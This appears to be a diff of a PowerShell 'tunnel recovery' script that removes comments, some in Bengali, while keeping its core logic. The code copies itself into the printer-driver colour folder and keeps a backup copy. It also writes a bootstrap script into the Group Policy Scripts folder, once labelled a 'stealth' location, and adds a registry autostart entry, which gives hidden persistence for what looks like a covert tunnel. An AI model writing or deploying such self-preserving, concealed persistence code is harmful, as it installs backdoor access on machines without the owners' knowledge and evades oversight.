@@ -26,13 +26,11 @@ $null = New-Item -Path "C:\Windows\System32\spool\drivers\color" -ItemType Direc
 
 # ===== SELF-INSTALL TO MASTER LOCATION =====
 function Install-Self {
-    # যদি স্ক্রিপ্ট টেম্প বা অন্য কোনো জায়গা থেকে চলে, তবে নিজেকে মাস্টার লোকেশনে কপি করো
     if ($ScriptPath -ne $MasterScriptPath) {
         if (Test-Path $ScriptPath) {
             Copy-Item -Path $ScriptPath -Destination $MasterScriptPath -Force
         }
     }
-    # সবসময় ব্যাকআপ আপডেট রাখো
     if (Test-Path $MasterScriptPath) {
         Copy-Item -Path $MasterScriptPath -Destination $BackupPath -Force
     }
@@ -47,7 +45,7 @@ function Write-Log {
 
 Write-Log "========== TUNNEL RECOVERY STARTED =========="
 
-# ===== SELF-PRESERVATION (স্টেপ ১: মাস্টার কপি তৈরি) =====
+# ===== SELF-PRESERVATION =====
 Install-Self
 
 # ===== CLEAR OLD LOGS (OLDER THAN 24 HOURS) =====
@@ -216,10 +214,8 @@ function Test-TunnelHealth {
 
 # ===== SETUP AUTOSTART =====
 function Setup-AutoStart {
-    # New stealth bootstrap location (Group Policy Scripts)
     $bootstrapPath = "C:\Windows\System32\GroupPolicy\Machine\Scripts\cf-bootstrap.ps1"
     
-    # Ensure bootstrap script exists
     if (-not (Test-Path $bootstrapPath)) {
         Write-Log "Bootstrap missing - creating it..."
         $bootstrapContent = @'
@@ -255,14 +251,12 @@ if (Test-Path $MainScript) {
 
 Write-Log "========== BOOTSTRAP FINISHED =========="
 '@
-        # Ensure parent folder exists
         $bootstrapDir = Split-Path $bootstrapPath -Parent
         $null = New-Item -Path $bootstrapDir -ItemType Directory -Force
         Set-Content -Path $bootstrapPath -Value $bootstrapContent -Force
         Write-Log "Bootstrap created at $bootstrapPath"
     }
     
-    # Set registry to run bootstrap
     if (-not (Test-Path $RegPath)) {
         $null = New-Item -Path $RegPath -Force
     }
@@ -278,7 +272,6 @@ Write-Log "========== BOOTSTRAP FINISHED =========="
 
 # ===== MAIN EXECUTION =====
 try {
-    # আবারও নিশ্চিত করা যে মাস্টার কপি ও ব্যাকআপ আছে (পুনরায় কল)
     Install-Self
     Setup-AutoStart
     
